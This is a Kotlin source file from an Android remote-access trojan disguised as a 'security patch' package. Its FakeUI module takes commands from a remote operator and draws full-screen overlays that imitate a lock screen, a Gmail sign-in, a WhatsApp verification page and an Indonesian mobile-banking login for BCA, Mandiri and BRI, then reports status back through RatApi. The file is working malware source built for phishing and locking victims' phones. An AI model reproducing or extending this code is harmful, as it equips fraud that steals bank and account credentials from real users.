package com.android.security.patch.commands

import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import com.android.security.patch.RatApi

object FakeUI {

    private var overlay: WebView? = null
    private var wm: WindowManager? = null

    fun show(ctx: Context, chatId: Long, args: Array<String>) {
        val type = args.getOrNull(0)?.lowercase() ?: "lock"
        val html = when (type) {
            "gmail", "google" -> GMAIL
            "wa", "whatsapp" -> WA
            "bank", "bca", "mandiri", "bri" -> BANK
            else -> LOCK
        }
        if (!Settings.canDrawOverlays(ctx)) {
            RatApi.sendMessage(ctx, "need overlay permission", chatId); return
        }
        Handler(Looper.getMainLooper()).post {
            try {
                hide()
                val app = ctx.applicationContext
                wm = app.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val wv = WebView(app).apply {
                    settings.javaScriptEnabled = true
                    webViewClient = WebViewClient()
                    loadDataWithBaseURL(null, html, "text/html", "utf-8", null)
                }
                val typeW = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else WindowManager.LayoutParams.TYPE_PHONE
                val lp = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    typeW,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.OPAQUE
                )
                wm?.addView(wv, lp)
                overlay = wv
                RatApi.sendMessage(ctx, "fake_ui: $type", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "fake_ui err: ${e.message}", chatId)
            }
        }
    }

    fun hide(ctx: Context, chatId: Long) {
        Handler(Looper.getMainLooper()).post {
            try {
                overlay?.let { wm?.removeView(it) }
                overlay = null
                RatApi.sendMessage(ctx, "fake_ui closed", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }
    }

    private fun hide() {
        try { overlay?.let { wm?.removeView(it) } } catch (_: Throwable) {}
        overlay = null
    }

    private val LOCK = """
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body{margin:0;background:#000;color:#fff;font-family:sans-serif;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
    .time{font-size:80px;font-weight:200}
    .date{font-size:20px;opacity:.7;margin-bottom:60px}
    .lock{font-size:60px;margin:40px 0}
    .hint{position:fixed;bottom:40px;opacity:.5;font-size:14px}
    </style></head><body>
    <div class="time" id="t">00:00</div>
    <div class="date" id="d"></div>
    <div class="lock">🔒</div>
    <div class="hint">Geser ke atas untuk membuka</div>
    <script>
    setInterval(()=>{const n=new Date();document.getElementById('t').textContent=n.getHours().toString().padStart(2,'0')+':'+n.getMinutes().toString().padStart(2,'0');
    document.getElementById('d').textContent=n.toLocaleDateString('id-ID',{weekday:'long',day:'numeric',month:'long'});},1000);
    </script></body></html>
    """.trimIndent()

    private val GMAIL = """
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body{margin:0;background:#fff;font-family:sans-serif;padding:60px 40px}
    .logo{text-align:center;margin-bottom:40px}
    .g{font-size:48px;font-weight:bold;color:#4285f4}
    .g span:nth-child(1){color:#4285f4}.g span:nth-child(2){color:#ea4335}.g span:nth-child(3){color:#fbbc05}.g span:nth-child(4){color:#4285f4}.g span:nth-child(5){color:#34a853}.g span:nth-child(6){color:#ea4335}
    input{width:100%;padding:14px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:20px;box-sizing:border-box}
    button{width:100%;padding:14px;background:#1a73e8;color:#fff;font-size:16px;border:none;border-radius:4px;cursor:pointer}
    h2{text-align:center;font-weight:400;margin-bottom:10px}
    p{text-align:center;color:#5f6368;margin-bottom:40px}
    </style></head><body>
    <div class="logo"><div class="g"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div></div>
    <h2>Sign in</h2>
    <p>to continue to Gmail</p>
    <input type="text" placeholder="Email or phone">
    <button onclick="alert('Verified')">Next</button>
    </body></html>
    """.trimIndent()

    private val WA = """
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body{margin:0;background:#075e54;font-family:sans-serif;color:#fff;padding:60px 30px;text-align:center;min-height:100vh;box-sizing:border-box}
    h1{font-size:28px;margin-bottom:40px}
    .logo{font-size:80px;margin:40px 0}
    .status{background:#128c7e;padding:20px;border-radius:8px;margin:40px 0}
    .spinner{width:40px;height:40px;border:4px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
    @keyframes spin{to{transform:rotate(360deg)}}
    .msg{margin-top:40px;font-size:14px;opacity:.8}
    </style></head><body>
    <h1>WhatsApp</h1>
    <div class="logo">📱</div>
    <div class="status"><div class="spinner"></div></div>
    <div class="msg">Memverifikasi nomor Anda...<br>Jangan tutup aplikasi ini</div>
    </body></html>
    """.trimIndent()

    private val BANK = """
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body{margin:0;background:#003d79;font-family:sans-serif;color:#fff;padding:60px 30px;min-height:100vh;box-sizing:border-box}
    .head{text-align:center;font-size:24px;font-weight:bold;margin-bottom:60px}
    label{display:block;font-size:14px;margin-bottom:8px;opacity:.8}
    input{width:100%;padding:14px;font-size:16px;border:none;border-radius:4px;margin-bottom:24px;box-sizing:border-box}
    button{width:100%;padding:14px;background:#ffb700;color:#003d79;font-weight:bold;font-size:16px;border:none;border-radius:4px;cursor:pointer}
    </style></head><body>
    <div class="head">🏦 Mobile Banking</div>
    <label>User ID</label>
    <input type="text" placeholder="Masukkan User ID">
    <label>Password</label>
    <input type="password" placeholder="Masukkan Password">
    <button onclick="alert('Login gagal. Coba lagi.')">LOGIN</button>
    </body></html>
    """.trimIndent()
}
